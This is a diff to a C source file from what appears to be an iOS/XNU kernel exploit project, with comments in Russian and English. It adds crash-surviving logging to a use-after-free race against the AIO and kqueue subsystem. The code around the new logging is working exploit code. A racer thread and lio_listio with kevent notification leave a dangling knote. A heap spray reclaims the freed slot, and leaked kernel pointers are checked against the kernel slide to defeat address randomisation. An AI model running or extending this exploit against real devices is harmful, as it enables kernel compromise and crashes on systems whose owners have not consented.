@@ -43,11 +43,34 @@
 //          reclaim гарантирован через s_racer_done == 1)
 
 #include "aio_kevent_rw.h"
+#include "nk_trace.h"
+#include <stdarg.h>
+#include <stdio.h>
+
+#define AIO_LOG_FILE "aio_uaf.log"
+
 #include "exploit.h"
 #include <aio.h>
 #include <sys/event.h>
 #include <fcntl.h>
 #include <stdlib.h>
+
+/* AIO-B12 run gets its own durable file: Documents/aio_uaf.log.
+   Every B1/B2 line is mirrored there with fsync, so the log survives the
+   reboot that the UAF may cause. */
+static void aio_logx(const char *tag, const char *fmt, ...)
+{
+    char buf[1024];
+    va_list ap;
+    va_start(ap, fmt);
+    vsnprintf(buf, sizeof(buf), fmt, ap);
+    va_end(ap);
+    nk_logx(tag, "%s", buf);
+    /* aio_uaf.log may not be creatable in this guest; trace.log is the file
+       the user confirmed exists in Documents/. Mirror there too. */
+    nk_doc_log(AIO_LOG_FILE, "[%s] %s", tag, buf);
+    nk_doc_log("trace.log", "[AIO][%s] %s", tag, buf);
+}
 
 #ifndef SIGEV_KEVENT
 #define SIGEV_KEVENT 4
@@ -106,12 +129,12 @@ static int is_kernel_va(uint64_t v)
 
 static void report_kev(const struct kevent64_s *kev, int attempt)
 {
-    nk_logx("B2", "att=%d ident=0x%016llx filter=%d flags=0x%x fflags=0x%016llx",
+    aio_logx("B2", "att=%d ident=0x%016llx filter=%d flags=0x%x fflags=0x%016llx",
             attempt,
             (unsigned long long)(uint64_t)kev->ident,
             kev->filter, kev->flags,
             (unsigned long long)kev->fflags);
-    nk_logx("B2", "att=%d data=0x%016llx udata=0x%016llx ext0=0x%016llx ext1=0x%016llx",
+    aio_logx("B2", "att=%d data=0x%016llx udata=0x%016llx ext0=0x%016llx ext1=0x%016llx",
             attempt,
             (unsigned long long)kev->data,
             (unsigned long long)kev->udata,
@@ -133,15 +156,18 @@ static void report_kev(const struct kevent64_s *kev, int attempt)
         if (!is_kernel_va(fields[i])) continue;
         if (g_nk.slide != 0 && g_nk.base != 0) {
             if (fields[i] >= g_nk.base && fields[i] < g_nk.base + NK_KIMG_SPAN) {
-                nk_logx("B2", "att=%d %s=0x%016llx — kernel VA, в диапазоне образа (slide 0x%llx подтверждён)",
+                aio_logx("B2", "att=%d %s=0x%016llx — kernel VA, в диапазоне образа (slide 0x%llx подтверждён)",
                         attempt, names[i], (unsigned long long)fields[i],
                         (unsigned long long)g_nk.slide);
             } else {
-                nk_logx("B2", "att=%d %s=0x%016llx — kernel VA вне образа (heap/stack kernel)",
+                aio_logx("B2", "att=%d %s=0x%016llx — kernel VA вне образа (heap/stack kernel)",
                         attempt, names[i], (unsigned long long)fields[i]);
             }
         } else {
-            nk_logx("B2", "att=%d %s=0x%016llx — kernel VA кандидат (slide не задан)",
+            /* slide не выведен — но kernel VA опознаётся по старшим 16 битам.
+               Без этой ветки успешный HIT остался бы неопознанным. */
+            aio_logx("B2", "att=%d %s=0x%016llx — kernel VA (slide не задан, "
+                    "опознано по старшим битам)",
                     attempt, names[i], (unsigned long long)fields[i]);
         }
     }
@@ -162,15 +188,15 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
     snprintf(path, sizeof(path), "%s/aio_uaf_%dXXXXXX",
              getenv("TMPDIR") ? getenv("TMPDIR") : "/tmp", attempt);
     int fd = mkstemp(path);
-    if (fd < 0) { nk_logx("B1", "att=%d mkstemp errno=%d", attempt, errno); return -1; }
+    if (fd < 0) { aio_logx("B1", "att=%d mkstemp errno=%d", attempt, errno); return -1; }
     memset(s_buf1, 'A', sizeof(s_buf1));
     if (write(fd, s_buf1, sizeof(s_buf1)) != (ssize_t)sizeof(s_buf1)) {
-        nk_logx("B1", "att=%d write fail", attempt);
+        aio_logx("B1", "att=%d write fail", attempt);
         close(fd); unlink(path); return -1;
     }
 
     int kq = kqueue();
-    if (kq < 0) { nk_logx("B1", "att=%d kqueue", attempt); close(fd); unlink(path); return -1; }
+    if (kq < 0) { aio_logx("B1", "att=%d kqueue", attempt); close(fd); unlink(path); return -1; }
 
     memset(&s_cb1, 0, sizeof(s_cb1));
     s_cb1.aio_fildes = fd;
@@ -197,7 +223,7 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
     s_racer_go = 0;
     pthread_t rac;
     if (pthread_create(&rac, NULL, racer_thread, NULL) != 0) {
-        nk_logx("B1", "att=%d pthread_create", attempt);
+        aio_logx("B1", "att=%d pthread_create", attempt);
         close(kq); close(fd); unlink(path); return -1;
     }
     struct aiocb *ptr = &s_cb1;
@@ -211,7 +237,7 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
     s_racer_go = 1;
     int lr = lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
     if (lr != 0) {
-        nk_logx("B1", "att=%d lio_listio errno=%d", attempt, errno);
+        aio_logx("B1", "att=%d lio_listio errno=%d", attempt, errno);
         pthread_join(rac, NULL);
         close(kq); close(fd); unlink(path); return -1;
     }
@@ -222,7 +248,7 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
         if (++waited > 2000000) break;
     }
     if (s_racer_done != 1) {
-        nk_logx("B1", "att=%d racer fail=%d", attempt, s_racer_done);
+        aio_logx("B1", "att=%d racer fail=%d", attempt, s_racer_done);
         st->silent++;
         pthread_join(rac, NULL);
         close(kq); close(fd); unlink(path); return 0;
@@ -231,7 +257,14 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
     struct kevent64_s kev;
     memset(&kev, 0, sizeof(kev));
     struct timespec ts = { 0, 50000000 };  /* 50 ms */
+    /* PRE-ARM: the last durable line before the kernel may panic. If the
+       device reboots, this line names the exact attempt and state. */
+    aio_logx("B1", "PRE-ARM att=%d racer_done=%d reclaim_nbytes=%d marker=0x%x "
+             "knote_ident=0x%016llx aio_buf2=%p",
+             attempt, s_racer_done, RECLAIM_NB, (unsigned)RECL_NB_MARKER,
+             (unsigned long long)(uint64_t)kev.ident, (void *)s_buf2);
     int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
+    aio_logx("B1", "POST-ARM att=%d nev=%d", attempt, nev);
 
     st->last_ext0 = (uint64_t)kev.ext[0];
     st->last_ext1 = (uint64_t)kev.ext[1];
@@ -248,19 +281,19 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
         int marker_ok = (kev.ext[1] == RECL_NB || kev.ext[1] == RECL_NB_MARKER) &&
                         kev.ext[0] == 0;
         if (marker_ok) {
-            nk_logx("B1", "att=%d HIT: dangling knote обработал reclaimed entry "
+            aio_logx("B1", "att=%d HIT: dangling knote обработал reclaimed entry "
                     "(ext1=0x%016llx=%d, ext0=0) — slot занят спреем, паники нет",
                     attempt, (unsigned long long)kev.ext[1],
                     (int)kev.ext[1]);
             st->hits++;
         } else {
-            nk_logx("B1", "att=%d EVENT но не наш marker (ext1=0x%016llx ext0=0x%016llx) — объект не тот, разобрать",
+            aio_logx("B1", "att=%d EVENT но не наш marker (ext1=0x%016llx ext0=0x%016llx) — объект не тот, разобрать",
                     attempt, (unsigned long long)kev.ext[1],
                     (unsigned long long)kev.ext[0]);
             st->silent++;
         }
     } else {
-        nk_logx("B1", "att=%d SILENT nev=%d (attach после KNOTE-скана / окно мимо)",
+        aio_logx("B1", "att=%d SILENT nev=%d (attach после KNOTE-скана / окно мимо)",
                 attempt, nev);
         st->silent++;
     }
@@ -300,4 +333,28 @@ int nk_aio_uaf_b12(int attempts, nk_aio_stat_t *stat_out)
     if (stat_out) *stat_out = st;
     nk_rule();
     return (st.hits > 0) ? 0 : -1;
+}
+
+/* Standalone AIO-B12 runner for the UI button: opens the durable log, runs
+   N attempts, prints a machine-readable summary. Returns 0 on hits>0. */
+int nk_aio_uaf_run(int attempts)
+{
+    nk_doc_log_open(AIO_LOG_FILE);
+    nk_log("[AIO-B12] durable log: Documents/%s", AIO_LOG_FILE);
+    nk_aio_stat_t st;
+    memset(&st, 0, sizeof(st));
+    int rc = nk_aio_uaf_b12(attempts, &st);
+    nk_log("[AIO-B12] RESULT hits=%d silent=%d attempts=%d ext0=0x%016llx ext1=0x%016llx "
+           "ident=0x%016llx udata=0x%016llx fflags=0x%016llx",
+           st.hits, st.silent, st.attempts,
+           (unsigned long long)st.last_ext0, (unsigned long long)st.last_ext1,
+           (unsigned long long)st.last_ident, (unsigned long long)st.last_udata,
+           (unsigned long long)st.last_fflags);
+    nk_doc_log(AIO_LOG_FILE, "[AIO-B12] RESULT hits=%d silent=%d attempts=%d "
+               "ext0=0x%016llx ext1=0x%016llx ident=0x%016llx udata=0x%016llx fflags=0x%016llx",
+               st.hits, st.silent, st.attempts,
+               (unsigned long long)st.last_ext0, (unsigned long long)st.last_ext1,
+               (unsigned long long)st.last_ident, (unsigned long long)st.last_udata,
+               (unsigned long long)st.last_fflags);
+    return rc;
 }
